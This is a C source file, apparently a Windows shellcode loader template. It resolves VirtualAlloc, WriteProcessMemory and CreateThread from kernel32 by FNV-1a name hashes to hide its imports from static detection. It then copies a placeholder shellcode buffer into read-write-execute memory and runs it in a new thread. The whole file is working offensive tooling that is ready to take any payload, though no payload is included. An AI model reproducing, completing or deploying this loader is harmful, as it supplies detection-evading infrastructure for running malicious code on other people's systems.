#include <windows.h>
#include <stdio.h>


unsigned int calcHash(const char *data) {
    unsigned int hash = 0x811C9DC5; 
    while (*data) {
        hash ^= (unsigned char)(*data);
        hash *= 0x01000193;
        data++;
    }
    return hash;
}

FARPROC getProcAddressByHash(HMODULE hModule, unsigned int hash) {
    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exportDir.VirtualAddress || !exportDir.Size) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDir.VirtualAddress);
    if (!pExportDir) return NULL;

    DWORD* pNameRVA = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfNames);
    DWORD* pFuncRVA = (DWORD*)((BYTE*)hModule + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* funcName = (const char*)((BYTE*)hModule + pNameRVA[i]);
        if (calcHash(funcName) == hash) {
            return (FARPROC)((BYTE*)hModule + pFuncRVA[i]);
        }
    }
    return NULL;
}

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        return 1;
    }

    unsigned int hashVirtualAlloc = calcHash("VirtualAlloc");
    unsigned int hashWriteProcessMemory = calcHash("WriteProcessMemory");
    unsigned int hashCreateThread = calcHash("CreateThread");

    FARPROC pVirtualAlloc = getProcAddressByHash(hKernel32, hashVirtualAlloc);
    FARPROC pWriteProcessMemory = getProcAddressByHash(hKernel32, hashWriteProcessMemory);
    FARPROC pCreateThread = getProcAddressByHash(hKernel32, hashCreateThread);

    if (!pVirtualAlloc || !pWriteProcessMemory || !pCreateThread) {
        FreeLibrary(hKernel32);
        return 1;
    }

    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

    VirtualAlloc_t VirtualAlloc = (VirtualAlloc_t)pVirtualAlloc;
    WriteProcessMemory_t WriteProcessMemory = (WriteProcessMemory_t)pWriteProcessMemory;
    CreateThread_t CreateThread = (CreateThread_t)pCreateThread;

    unsigned char shellcode[] = {
        // Your shellcode buffer here . . .
    };

    SIZE_T shellcodeSize = sizeof(shellcode);

    LPVOID allocatedMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocatedMemory) {
        return 1;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(GetCurrentProcess(), allocatedMemory, shellcode, shellcodeSize, &bytesWritten) ||
        bytesWritten != shellcodeSize) {
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (!hThread) {

        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}